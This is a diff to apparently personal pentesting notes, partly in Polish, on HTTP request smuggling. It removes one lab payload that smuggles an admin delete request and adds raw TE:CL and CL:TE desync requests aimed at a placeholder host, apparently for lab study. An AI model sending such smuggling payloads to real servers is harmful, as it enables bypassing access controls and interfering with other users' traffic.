@@ -791,19 +791,21 @@ Transfer-Encoding: chunked
 SMUGGLED
 0
 ```
+### Potwierdzenie istnienia TE:CL
 ```
-POST / HTTP/1.1
-Host: your-lab-id.web-security-academy.net
-Content-length: 4
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
 Transfer-Encoding: chunked
 
-87
-GET /admin/delete?username=carlos HTTP/1.1
-Host: localhost
+7c
+GET /404 HTTP/1.1
+Host: vulnerable-website.com
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 15
+Content-Length: 144
 
-x=1
+x=
 0
 ```
 ## CL:TE
@@ -816,6 +818,21 @@ Transfer-Encoding: chunked
 0
 
 SMUGGLED
+```
+Potwierdzenie istnienia CL:TE
+```
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 49
+Transfer-Encoding: chunked
+
+e
+q=smuggling&x=
+0
+
+GET /404 HTTP/1.1
+Foo: x
 ```
 ```
 POST /home HTTP/1.1
